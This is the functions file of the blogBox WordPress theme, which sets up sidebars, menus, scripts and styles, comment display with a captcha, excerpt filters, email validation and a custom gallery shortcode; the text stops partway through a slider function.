<?php
/*
 * Main functions file
 * 
 * This file is WordPress functions file, which which contains many of the functions 
 * for set up and operation of the theme
 *
 * @package		blogBox WordPress Theme
 * @copyright	Copyright (c) 2012, Kevin Archibald
 * @license		http://www.gnu.org/licenses/quick-guide-gplv3.html  GNU Public License
 * @author		Kevin Archibald <www.kevinsspace.ca/contact/>
 */

/* ========================================================================================================
 *                 Set Up
 * ======================================================================================================== */
 
/* ---- load files ---------------*/ 
require(get_template_directory() . '/library/blogBox_options.php');
require(get_template_directory() . '/library/blogBox_post_functions.php');
require(get_template_directory() . '/widgets/blogBox_social_widget.php');

/* ---- Set content width --------*/
if(!isset( $content_width )) $content_width = 600;

function blogBox_theme_supports(){
	//enable translation
    load_theme_textdomain('blogBox', get_template_directory() . '/language');
	/* ------------editor-style -------------------- */
 	add_editor_style();
	// ADD POST FORMATS
	add_theme_support( 'post-formats', array( 'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video' ) );
	//Custom Backgrounds 
	add_theme_support('custom-background');
	//custom header
	$bB_header_args = array(
		'flex-width' => true,
		'width' => 960,
		'flex-height' => true,
		'height' => 320,
		'header-text' => false,
		'default-image' => '',
		'uploads' => true,
	);
	add_theme_support('custom-header',$bB_header_args);
	//feeds
	add_theme_support('automatic-feed-links');
	//thumbnails
	add_theme_support('post-thumbnails');
	add_image_size('wide_thumbnail',180,120);
}
add_action('after_setup_theme', 'blogBox_theme_supports');
  
/*
********* Set up Menu in Dashboard under Appearance **************
*/
function blogBox_register_menu() {
	register_nav_menu('primary-nav','Primary Menu');
}
add_action( 'init', 'blogBox_register_menu' );

/**
 * Register Side bars
 * Thans to Justin Tadlock for the post on sidebars 
 * @link http://justintadlock.com/archives/2010/11/08/sidebars-in-wordpress
 */

if (!function_exists ( 'blogBox_register_sidebars' )) {
	function blogBox_register_sidebars() {
	// Sidebars and footer areas
    register_sidebar(array(
    					'id' => 'blogbox_default_sidebar',
    					'name'=>'Default-Sidebar',
    					'description' => __( 'Default sidebar', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_header_sidebar',
						'name'=>'Header-Sidebar',
						'description' => __( 'Placed in upper right hand corner of header', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_feature',
						'name'=>'Feature Area',
						'description' => __( 'Feature widgetized area', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_left_sidebar',
						'name'=>'Left-Sidebar',
						'description' => __( 'Sidebar for left side of page', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_left_sidebar_2',
						'name'=>'Left-Sidebar 2',
						'description' => __( 'Sidebar for left side page 2', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_right_sidebar',
						'name'=>'Right-Sidebar',
						'description' => __( 'Sidebar for right side of page', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_right_sidebar_2',
						'name'=>'Right-Sidebar 2',
						'description' => __( 'Sidebar for right side page 2', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_contact_sidebar',
						'name'=>'Contact-Sidebar',
						'description' => __( 'Sidebar for contact page', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_404_sidebar',
						'name'=>'Sidebar-404',
						'description' => __( 'Sidebar for 404 page', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);								
	register_sidebar(array(
						'id' => 'blogbox_footer_a',
						'name'=>'Footer A',
						'description' => __( 'Use this for the first footer column', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_footer_b',
						'name'=>'Footer B',
						'description' => __( 'Use this for the second footer column', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	register_sidebar(array(
						'id' => 'blogbox_footer_c',
						'name'=>'Footer C',
						'description' => __( 'Use this for the third footer column', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);				
	register_sidebar(array(
						'id' => 'blogbox_footer_d',
						'name'=>'Footer D',
						'description' => __( 'Use this for the fourth footer column', 'blogBox' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget' => '</div>',
						'before_title' => '<h3 class="widget-title">',
						'after_title' => '</h3>'
						)
					);
	}

	add_action( 'widgets_init', 'blogBox_register_sidebars' );
}

/* ========================================================================================================
 *                 Scripts and Styles
 * ======================================================================================================== */

define('BLOGBOX_JS', get_template_directory_uri() . '/js' );

if ( !function_exists ('blogBox_load_js')){
	function blogBox_load_js() {
		if(!is_admin()){
			global $blogBox_option,$wp_version;
			$blogBox_option = blogBox_get_options(); 
			wp_enqueue_script('jquery');

			wp_enqueue_script( 'superfish', BLOGBOX_JS . '/superfish/superfish.min.js', array( 'jquery' ), '' );
			wp_enqueue_script( 'easing', BLOGBOX_JS . '/jquery.easing.1.3.js', array( 'jquery' ), '' );
			wp_enqueue_script( 'slides', BLOGBOX_JS . '/nivo-slider/jquery.nivo.slider.pack.js', array( 'jquery' ), '' );
			wp_enqueue_script( 'blogBox_custom', BLOGBOX_JS . '/doc_ready_scripts.js', array( 'jquery' ), '' );
			
			if ( $blogBox_option['bB_disable_fitvids'] != 1 ) {
				wp_enqueue_script( 'blogBox_fitvids', BLOGBOX_JS . '/jquery.fitvids.js', array( 'jquery' ), '' );
				wp_enqueue_script( 'blogBox_fitvids_doc_ready', BLOGBOX_JS . '/fitvids-doc-ready.js', array( 'jquery' ), '' );
			}
			
			if ( $blogBox_option['bB_include_mobile_design'] == 1 ) {
				wp_enqueue_script( 'mobile_doc_ready', get_template_directory_uri() . '/js/mobile-doc-ready.js', array( 'jquery' ), '' );
			}
			
			if ( $wp_version < 3.6 ) {
				if ( $blogBox_option['bB_disable_audiojs'] != 1 ) {
					wp_enqueue_script( 'audiojs', get_template_directory_uri() . '/js/audiojs/audio.js', array( 'jquery' ), '' );
					wp_enqueue_script( 'audiojs_doc_ready', get_template_directory_uri() . '/js/audiojs/audiojs-doc-ready.js', array( 'jquery' ), '' );
				}
			} else {
				/*Put in a forum post in the beta section, in the GitHub, and stackoverflow regarding the problem of responsiveness. I got no response so I hacked the plugin myself.*/
				wp_deregister_script('mediaelement');
				wp_enqueue_script('mediaelement',get_template_directory_uri() . '/js/mediaelement-and-player-min.js', array( 'jquery' ), '' ,true);
			}

			if ( $blogBox_option['bB_disable_colorbox'] != 1 ) {
				wp_enqueue_script( 'colorbox', get_template_directory_uri() . '/js/colorbox/jquery.colorbox-min.js', array( 'jquery' ), '' );
				wp_enqueue_script( 'colorbox_doc_ready', get_template_directory_uri() . '/js/colorbox/colorbox_doc_ready.js', array( 'jquery' ), '' );
			}
		}
	}
	add_action('init', 'blogBox_load_js');
}

if ( !function_exists ('blogBox_styles')) {
	function blogBox_styles() {
		global $blogBox_option,$wp_version;
		$blogBox_option = blogBox_get_options(); 
		wp_register_style( 'main_style',get_stylesheet_directory_uri() . '/style.css',array() );
		wp_enqueue_style( 'main_style' ); 
		wp_register_style( 'nivo_style',get_template_directory_uri() . '/js/nivo-slider/nivo-slider.css',array() );
		wp_enqueue_style( 'nivo_style' );
		wp_register_style( 'nivo_style_theme',get_template_directory_uri() . '/js/nivo-slider/themes/default/default.css',array() );
		wp_enqueue_style( 'nivo_style_theme' );
		wp_register_style( 'superfish_style',get_template_directory_uri() . '/js/superfish/superfish.css',array() );
		wp_enqueue_style( 'superfish_style' );
		wp_register_style( 'font_awesome_style',get_template_directory_uri() . '/font-awesome/css/font-awesome.min.css',array() );
		wp_enqueue_style( 'font_awesome_style' );
		
		if ( $wp_version < 3.6 ) {
			if ( $blogBox_option['bB_disable_audiojs'] != 1 ) {
				wp_register_style( 'audiojs_style',get_template_directory_uri() . '/js/audiojs/audiojs.css',array() );
				wp_enqueue_style( 'audiojs_style' );
			}
		}
		
		if ( $blogBox_option['bB_disable_colorbox'] != 1 ) {
			wp_register_style( 'colorbox_style',get_template_directory_uri() . '/js/colorbox/colorbox.css',array() );
			wp_enqueue_style( 'colorbox_style' );
		}
		
		if ( $blogBox_option['bB_include_mobile_design'] == 1 ) {
			wp_register_style( 'mobile_style',get_template_directory_uri() . '/css/mobile.css',array() );
			wp_enqueue_style( 'mobile_style' );
		}
	}
	add_action('wp_enqueue_scripts', 'blogBox_styles');
}

if ( !function_exists ('blogBox_setup')){// load custom styles and fonts
	function blogbox_setup(){ 
	         include( get_template_directory() . '/library/custom-fonts.php' );
	         include( get_template_directory() . '/library/custom-styles.php' );
	 }
	add_action( 'wp_print_styles', 'blogbox_setup' );
}

if ( !function_exists ('blogBox_enqueue_ie_script')){//Script for loading js shiv for ie HTML5
	function blogBox_enqueue_ie_script() {
		global $is_IE;
		if ( $is_IE ) {
			wp_register_script( 'ie_html5_shiv', BLOGBOX_JS.'/html5.js', array( 'jquery' ), '');
			wp_enqueue_script('ie_html5_shiv');
		}
	}
	add_action('wp_enqueue_scripts', 'blogBox_enqueue_ie_script');
}

if ( !function_exists ('blogBox_title_filter')){
	function blogBox_title_filter($title) {
		if(is_front_page()) {
			$return = 'home | '.get_bloginfo( 'name' );
		} else {
			$return = $title.' | '.get_bloginfo( 'name' );
		}
		
	    return $return;
	}
	add_filter( 'wp_title', 'blogBox_title_filter', 10, 3 );
}

/* ========================================================================================================
 *              Comments and Pingbacks
 * ======================================================================================================== */
/**
 * Javascript setup for threaded comments
 */
if ( !function_exists ('blogBox_enqueue_comment_reply_script')){//enque of enque reply script as per http://make.wordpress.org/themes/tag/guidelines/
	function blogBox_enqueue_comment_reply_script() {
		if (is_singular() && comments_open() && (get_option('thread_comments') == 1)) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
	add_action( 'wp_enqueue_scripts', 'blogBox_enqueue_comment_reply_script' );
}

if ( !function_exists ('blogBox_cleanPings')){// clean pingbacks and trackbacks
	function blogBox_cleanPings($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment;
		echo '<li>';
		echo comment_author_link().'&nbsp;&nbsp;';
		edit_comment_link('Edit');
		echo '</li><br/>';
	}
}

/**
 * Custom Comments Display
 * @link http://codex.wordpress.org/Function_Reference/wp_list_comments
 * 
 * 
 */
if (!function_exists ('blogBox_comment')){
	function blogBox_comment($comment, $args, $depth) {
		
		global $blogBox_option;
		$blogBox_option = blogBox_get_options();
		$exclude_mystery_gravatar = $blogBox_option['bB_exclude_mystery_gravatar'];
		
		$GLOBALS['comment'] = $comment;
		extract($args, EXTR_SKIP);
	
		if ( 'div' == $args['style'] ) {
			$tag = 'div';
			$add_below = 'comment';
		} else {
			$tag = 'li';
			$add_below = 'div-comment';
		}
		?>
		
		<<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
		<?php if ( 'div' != $args['style'] ) : ?>
			<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
		<?php endif; ?>
			
		<div class="comment-author vcard">
			<?php
				if( $exclude_mystery_gravatar == 1 ) {
					$has_valid_avatar = blogBox_validate_gravatar(get_comment_author_email($comment->comment_ID));
					If ( $has_valid_avatar == 1 ) {
				 		if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['avatar_size'] ); 
					}
				} else {
					if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['avatar_size'] );
				}	
			 ?>
			<?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author()) ?>
		</div>
		
		<?php if ($comment->comment_approved == '0') : ?>
			<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.','blogBox') ?></em>
			<br />
		<?php endif; ?>

		<?php comment_text() ?>
			
		<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
			<?php
				/* translators: 1: date, 2: time */
				printf( __('%1$s at %2$s','blogBox'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('Edit','blogBox'),'  ','' );
			?>
		</div>
		
		<br/>
		
		<div class="reply">
			<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
		</div>
		
		<?php if ( 'div' != $args['style'] ) : ?>
		</div>
		<?php endif; ?>
		
		<?php
	}
}

/**
 * This function was taken from http://codex.wordpress.org/Using_Gravatars
 * It checks the gravatar site for a valid gravatar for the email supplied and 
 * returns a boolean true or false
 */
if (!function_exists ('blogBox_validate_gravatar')){
	function blogBox_validate_gravatar($email) {
		// Craft a potential url and test its headers
		$hash = md5(strtolower(trim($email)));
		$uri = 'http://www.gravatar.com/avatar/' . $hash . '?d=404';
		$headers = @get_headers($uri);
		if (!preg_match("|200|", $headers[0])) {
			$has_valid_avatar = FALSE;
		} else {
			$has_valid_avatar = TRUE;
		}
		return $has_valid_avatar;
	}
}

/* ========================================================================================================
 *              Captcha
 * ======================================================================================================== */
/*
 * ------------------- Comment Captcha ------------------------- 
 * 
 * Modified code from Chip Bennet's post 
 *  at http://www.chipbennett.net/2010/07/29/using-really-simple-captcha-plugin-for-comments/
 * Captcha from Book "Headfirst PHP & MYSQL"
 * 
 * -------------Add Captcha to comment form -------------------*/
if ( !function_exists ('blogBox_comment_captcha')){//add comment captcha 
	function blogBox_comment_captcha () { 
		$blogBox_option = blogBox_get_options();
		if (!is_user_logged_in() && $blogBox_option['bB_show_comment_captcha'] == 1) { ?>
	 		
	 		<label>Verification * </label>
			<input type="text" id="comment_captcha_response" name="comment_captcha_response" value="<?php _e('Enter Captcha','blogBox'); ?>" onclick="this.select();" />
			
			<?php if ( $blogBox_option['bB_use_color_captcha'] == 1 ) { ?>
				<img src="<?php echo get_template_directory_uri(); ?>/captcha/kabb_captcha_color.php" alt="Verification Captcha" />
			<?php } else { ?>
				<img src="<?php echo get_template_directory_uri(); ?>/captcha/kabb_captcha_bw.php" alt="Verification Captcha" />
			<?php } ?>
			
			<br/><br/>
		<?php }
	}
	add_action( 'comment_form_after_fields' , 'blogBox_comment_captcha' );
}

if ( !function_exists ('blogBox_check_comment_captcha')){//Validate Captcha Entry
	function blogBox_check_comment_captcha( $comment_data  ) { 
		$blogBox_option = blogBox_get_options();
		if ( ( ! is_user_logged_in() ) && ($comment_data['comment_type'] == '') && $blogBox_option['bB_show_comment_captcha'] == 1) {
			 if(!isset($_SESSION)) session_start();
			// This variable will hold the result of the CAPTCHA validation. Set to 'false' until CAPTCHA validation passes	
			$blogBox_comment_captcha_correct = false; 		
			// Validate the CAPTCHA response
			if ($_SESSION['kabb_pass_phrase'] == SHA1($_POST['comment_captcha_response'])){
				$blogBox_comment_captcha_correct = true; 
			}	
			// If CAPTCHA validation fails (incorrect value entered in CAPTCHA field) don't process the comment.
			if ( $blogBox_comment_captcha_correct == false ) { ?>
				
				<?php if ( $blogBox_option['bB_use_color_captcha'] == 1 ) { ?>
					<img style="visibility:hidden;" src="<?php echo get_template_directory_uri(); ?>/captcha/kabb_captcha_color.php" alt="Verification Captcha" />
					<?php } else { ?>
						<img style="visibility:hidden;" src="<?php echo get_template_directory_uri(); ?>/captcha/kabb_captcha_bw.php" alt="Verification Captcha" />
					<?php } ?>
					
				<?php wp_die(_e('You have entered an incorrect CAPTCHA value. Click the BACK button on your browser, and try again.','blogBox'));
				break;
			} 
			// if CAPTCHA validation passes (correct value entered in CAPTCHA field), process the comment as per normal
			session_destroy();
			return $comment_data;
			} else {
				return $comment_data;
			}
	}
	add_filter('preprocess_comment', 'blogBox_check_comment_captcha');
}

/* ========================================================================================================
 *              Filters
 * ======================================================================================================== */

 /* THE_EXCERT modified from http://wordpress.org/support/topic/dynamic-the_excerpt?replies=22 */
if ( !function_exists ('blogBox_the_excerpt_dynamic')){// Outputs an excerpt of variable length (in characters)
	function blogBox_the_excerpt_dynamic($length) { 
		
		global $post;
		$text = $post->post_excerpt;
		if ( '' == $text ) {
			$text = get_the_content('');
			$text = apply_filters('the_content', $text);
			$text = str_replace(']]>', ']]>', $text);
		}
		//I'm checking for my own conatct-pizazz plug-in here so that you can include the shortcodes I know about.
		if (function_exists('content_pizazz_list_func()')) {
			$text = do_shortcode($text);
		} else {
			strip_shortcodes($text);
		}
		
		$text = strip_tags($text,'<p></p><i></i><ol></ol><ul></ul><br/><br /><li></li>');
		
		$output = strlen($text);
		if($output > $length ) {
			$break_pos = strpos($text, ' ', $length);//find next space after desired length
			if($break_pos == '')$break_pos = $length;
			$text = substr($text,0,$break_pos);
			$text = $text.' <a href="'. get_permalink($post->ID) . '" > [...]</a>';
			$text = force_balance_tags($text);
		}
	
		echo apply_filters('the_excerpt',$text);
	}
}

if ( !function_exists ('blogBox_portfolio_titles')){//function to limit characters in portfolio titles
	function blogBox_portfolio_titles($content,$limit){
		$content = strip_tags($content);
		if(strlen($content) > $limit){
	    	$visible = substr($content, 0, $limit);
			$visible = $visible.'&nbsp;...';
		} else {
			$visible = $content;
		}
		//return $visible;
		echo strip_tags(apply_filters('the_excerpt',$visible));
	}
}

if ( !function_exists ('blogBox_portfolio_feature_description')){//function to limit characters in portfolio titles
	function blogBox_portfolio_feature_description($content,$limit){
		$content = do_shortcode($content);
		$content = strip_tags($content,'<p></p><i></i><ol></ol><ul></ul><br/><li></li>');
		if(strlen($content) > $limit){
			$break_pos = strpos($content, ' ', $limit);//find next space after desired length
			if($break_pos == '')$break_pos = $limit;
	    	$visible = substr($content, 0, $break_pos);
			$visible = $visible.'&nbsp;...';
			$visible = force_balance_tags($visible);
		} else {
			$visible = $content;
		}
		echo apply_filters('the_content',$visible);
	}
}

/*
 * --------------------HTML Validation Filters ------------------------ 
  * the rel tag does not validate it says it does not like the term category
  * Discussion at wordpess.org suggests it is an HTML/W#C issue.Browsers do 
  * not use this attribute in any way. However, search engines can use this 
  * attribute to get more information about a link.
  */
if ( !function_exists ('blogBox_html5_fix_the_category')){//rel tag validation fix
	function blogBox_html5_fix_the_category($content) { 
	
	        $pattern = '/rel="category tag"/';
	        $replacement = 'rel="tag"';
	        $content = preg_replace($pattern, $replacement, $content);
	        return $content;
	}
	add_filter('the_category','blogBox_html5_fix_the_category');
}

/*
 * Plugin Name: Shortcode Empty Paragraph Fix
 * Plugin URI: http://www.johannheyne.de/wordpress/shortcode-empty-paragraph-fix/
 * Description: Fix issues when shortcodes are embedded in a block of content that is filtered by wpautop.
 * Author URI: http://www.johannheyne.de
 * Version: 0.1
 * Put this in /wp-content/plugins/ of your Wordpress installation
 */   

if ( !function_exists ('blogBox_shortcode_paragraph_insertion_fix')){//Empty Paragraph Fix
	function blogBox_shortcode_paragraph_insertion_fix($content) { 
	    $array = array (
	        '<p>[' => '[', 
	        ']</p>' => ']', 
	        ']<br />' => ']',
	        ']<br/>' => ']'
	    );
	    $content = strtr($content, $array);
	    return $content;
	}
	add_filter('the_content', 'blogBox_shortcode_paragraph_insertion_fix'); 
}

add_filter('widget_text', 'do_shortcode');// Allows shortcodes to be displayed in sidebar widgets

/* ========================================================================================================
 *              Miscelaneous
 * ======================================================================================================== */

if ( !function_exists ('blogBox_validEmail')){    
	function blogBox_validEmail($email)
	{
		$isValid = true;
		$atIndex = strrpos($email, "@");
		if (is_bool($atIndex) && !$atIndex)
		{
			$isValid = false;
		}
		else
		{
			$domain = substr($email, $atIndex+1);
			$local = substr($email, 0, $atIndex);
			$localLen = strlen($local);
			$domainLen = strlen($domain);
			if ($localLen < 1 || $localLen > 64)
			{
				// local part length exceeded
				$isValid = false;
			}
			else if ($domainLen < 1 || $domainLen > 255)
			{
				// domain part length exceeded
				$isValid = false;
			}
			else if ($local[0] == '.' || $local[$localLen-1] == '.')
			{
				// local part starts or ends with '.'
				$isValid = false;
			}
			else if (preg_match('/\\.\\./', $local))
			{
				// local part has two consecutive dots
				$isValid = false;
			}
			else if (!preg_match('/^[A-Za-z0-9\\-\\.]+$/', $domain))
			{
				// character not valid in domain part
				$isValid = false;
			}
			else if (preg_match('/\\.\\./', $domain))
			{
				// domain part has two consecutive dots
				$isValid = false;
			}
			else if(!preg_match('/^(\\\\.|[A-Za-z0-9!#%&`_=\\/$\'*+?^{}|~.-])+$/', str_replace("\\\\","",$local)))
			{
				// character not valid in local part unless 
				// local part is quoted
				if (!preg_match('/^"(\\\\"|[^"])+"$/', str_replace("\\\\","",$local)))
				{
					$isValid = false;
				}
			}
			if ($isValid && !(checkdnsrr($domain,"MX") || checkdnsrr($domain,"A")))
			{
				// domain not found in DNS
				$isValid = false;
			}
		}
		return $isValid;
	}
}


/**
 * blogBox exclude categories
 *
 * This helper function is used in page-home-blog.php and index.php.
 * It returns an exclusion string for $wp-query, and is based on user settings to
 * eclude the Feature and Portfolio categories.
 * 
 * @return $exclude_categories
 */
if ( !function_exists ('blogBox_exclude_categories')){//Exclude categories helper
	function blogBox_exclude_categories () { 
	 	$blogBox_option = blogBox_get_options();
		$exclude_categories = "'";
		$feature_cat_ID = get_cat_ID('Feature');
		$portfolioA_cat_ID = get_cat_ID(sanitize_text_field($blogBox_option['bB_portfolioA_category']));
		$portfolioB_cat_ID = get_cat_ID(sanitize_text_field($blogBox_option['bB_portfolioB_category']));
		$portfolioC_cat_ID = get_cat_ID(sanitize_text_field($blogBox_option['bB_portfolioC_category']));
		$portfolioD_cat_ID = get_cat_ID(sanitize_text_field($blogBox_option['bB_portfolioD_category']));
		$portfolioE_cat_ID = get_cat_ID(sanitize_text_field($blogBox_option['bB_portfolioE_category']));
		if ($feature_cat_ID !== 0 && $blogBox_option['bB_showfeaturepost'] == 0) $exclude_categories = $exclude_categories . "-" . $feature_cat_ID;
		if ($portfolioA_cat_ID !== 0 && $blogBox_option['bB_showfeatureApost'] == 0 && $exclude_categories !== "'") {
			 $exclude_categories = $exclude_categories . ",-" . $portfolioA_cat_ID;
		}
		elseif ($portfolioA_cat_ID !== 0 && $blogBox_option['bB_showfeatureApost'] == 0 && $exclude_categories == "'") {
			 $exclude_categories = $exclude_categories . "-" . $portfolioA_cat_ID;
		}
		if ($portfolioB_cat_ID !== 0 && $blogBox_option['bB_showfeatureBpost'] == 0 && $exclude_categories !== "'") {
			 $exclude_categories = $exclude_categories . ",-" . $portfolioB_cat_ID;
		}
		elseif ($portfolioB_cat_ID !== 0 && $blogBox_option['bB_showfeatureBpost'] == 0 && $exclude_categories == "'") {
			 $exclude_categories = $exclude_categories . "-" . $portfolioB_cat_ID;
		}
		if ($portfolioC_cat_ID !== 0 && $blogBox_option['bB_showfeatureCpost'] == 0 && $exclude_categories !== "'") {
			 $exclude_categories = $exclude_categories . ",-" . $portfolioC_cat_ID;
		}
		elseif ($portfolioC_cat_ID !== 0 && $blogBox_option['bB_showfeatureCpost'] == 0 && $exclude_categories == "'") {
			 $exclude_categories = $exclude_categories . "-" . $portfolioC_cat_ID;
		}
		if ($portfolioD_cat_ID !== 0 && $blogBox_option['bB_showfeatureDpost'] == 0 && $exclude_categories !== "'") {
			 $exclude_categories = $exclude_categories . ",-" . $portfolioD_cat_ID;
		}
		elseif ($portfolioD_cat_ID !== 0 && $blogBox_option['bB_showfeatureDpost'] == 0 && $exclude_categories == "'") {
			 $exclude_categories = $exclude_categories . "-" . $portfolioD_cat_ID;
		}
		if ($portfolioE_cat_ID !==0 && $blogBox_option['bB_showfeatureEpost'] == 0 && $exclude_categories !== "'") {
			 $exclude_categories = $exclude_categories . ",-" . $portfolioE_cat_ID;
		}
		elseif ($portfolioE_cat_ID !== 0 && $blogBox_option['bB_showfeatureEpost'] == 0 && $exclude_categories == "'") {
			 $exclude_categories = $exclude_categories . "-" . $portfolioE_cat_ID;
		}
		$exclude_categories = $exclude_categories . "'"	;
	
		return $exclude_categories;
	}
}

/**
 * Custom WordPress Gallery code
 * 
 * Remove Wordpress gallery shortcode and add our own. The purpose is to remove the css from
 * being injected into the post, and to fix the dd error.
 * Basis is from @link http://wpengineer.com/1802/a-solution-for-the-wordpress-gallery/
 * 
 * Note : This is not set up as a conditional load because it will not work. Therefore you can't 
 * modify this function in a child theme
 * 
 */
//deactivate WordPress function
remove_shortcode('gallery', 'gallery_shortcode');
//activate own function
add_shortcode('gallery', 'blogBox_gallery_shortcode');
//the own renamed function
function blogBox_gallery_shortcode($attr) {
	$post = get_post();

	static $instance = 0;
	$instance++;

	if ( ! empty( $attr['ids'] ) ) {
		// 'ids' is explicitly ordered, unless you specify otherwise.
		if ( empty( $attr['orderby'] ) )
			$attr['orderby'] = 'post__in';
		$attr['include'] = $attr['ids'];
	}

	// Allow plugins/themes to override the default gallery template.
	$output = apply_filters('post_gallery', '', $attr);
	if ( $output != '' )
		return $output;

	// We're trusting author input, so let's at least make sure it looks like a valid orderby statement
	if ( isset( $attr['orderby'] ) ) {
		$attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
		if ( !$attr['orderby'] )
			unset( $attr['orderby'] );
	}

	extract(shortcode_atts(array(
		'order'      => 'ASC',
		'orderby'    => 'menu_order ID',
		'id'         => $post->ID,
		'itemtag'    => 'dl',
		'icontag'    => 'dt',
		'captiontag' => 'dd',
		'columns'    => 3,
		'size'       => 'thumbnail',
		'include'    => '',
		'exclude'    => ''
	), $attr));

	$id = intval($id);
	if ( 'RAND' == $order )
		$orderby = 'none';

	if ( !empty($include) ) {
		$_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );

		$attachments = array();
		foreach ( $_attachments as $key => $val ) {
			$attachments[$val->ID] = $_attachments[$key];
		}
	} elseif ( !empty($exclude) ) {
		$attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	} else {
		$attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	}

	if ( empty($attachments) )
		return '';

	if ( is_feed() ) {
		$output = "\n";
		foreach ( $attachments as $att_id => $attachment )
			$output .= wp_get_attachment_link($att_id, $size, true) . "\n";
		return $output;
	}

	$itemtag = tag_escape($itemtag);
	$captiontag = tag_escape($captiontag);
	$columns = intval($columns);
	//$itemwidth = $columns > 0 ? floor(100/$columns) : 100;
	$float = is_rtl() ? 'right' : 'left';

	$selector = "gallery-{$instance}";

	$output = apply_filters('gallery_style', "<div id='$selector' class='gallery galleryid-{$id}'>");
	$i = 0;
	foreach ( $attachments as $id => $attachment ) {
		$link = isset($attr['link']) && 'file' == $attr['link'] ? wp_get_attachment_link($id, $size, false, false) : wp_get_attachment_link($id, $size, true, false);

		$output .= "<{$itemtag} class='gallery-item col-{$columns}'>";
		$output .= "
			<{$icontag} class='gallery-icon'>
				$link
			</{$icontag}>";
		if ( $captiontag && trim($attachment->post_excerpt) ) {
			$output .= "
				<{$captiontag} class='wp-caption-text gallery-caption'>
				" . wptexturize($attachment->post_excerpt) . "
				</{$captiontag}>";
		} else {
			$output .= "
				<{$captiontag} class='wp-caption-text gallery-caption'>
				
				</{$captiontag}>";
		}
		$output .= "</{$itemtag}>";
		if ( $columns > 0 && ++$i % $columns == 0 )
			$output .= '<br/>';
	}

	$output .= "</div>\n";

	return $output;
}

if ( !function_exists ('blogBox_feature_slider')){    
	function blogBox_feature_slider() {
		global $blogBox_option;
		$blogBox_option = blogBox_get_options();
		$feature_option = sanitize_text_field($blogBox_option['bB_home1feature_options']);
		$use_feature_widget_area = $blogBox_option['bB_use_feature_widget'];
		echo '<div id="feature-area">';
		if( $feature_option == "Full feature slides" ) {
			echo '<div class="slider-wrapper theme-default">';
				echo '<div class="ribbon"></div>';
				echo '<div id="full-slider">';
		} elseif ( $feature_option == "Full feature slides-thumbnails" ) {
			echo '<div class="slider-wrapper theme-default">';
				echo '<div class="ribbon"></div>';
				echo '<div id="full-slider-thumb">';
		} elseif ( $feature_option == "Small slides and feature text box" ) {
			echo '<div class="half-slider-wrapper theme-default">';
				echo '<div class="ribbon"></div>';
				echo '<div id="half-slider">';
